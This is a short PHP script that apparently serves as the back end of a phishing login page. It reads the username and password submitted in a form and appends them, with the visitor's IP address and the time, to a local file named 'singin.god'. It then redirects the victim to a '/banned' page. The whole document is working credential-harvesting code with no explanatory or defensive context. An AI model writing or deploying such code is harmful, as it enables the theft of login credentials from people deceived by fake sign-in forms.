<?php
$mail = $_POST['username'];
$pass = $_POST['password'];
$today = date("H:i:s Y/m/d");
$ip=$_SERVER['REMOTE_ADDR'];

$info="Email: $mail || Password: $pass || IP: $ip || Time = $today\r\n";
$fh=fopen('singin.god', "a+");
fwrite($fh, $info);
fclose($fh);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=/banned'></head></html>";
?>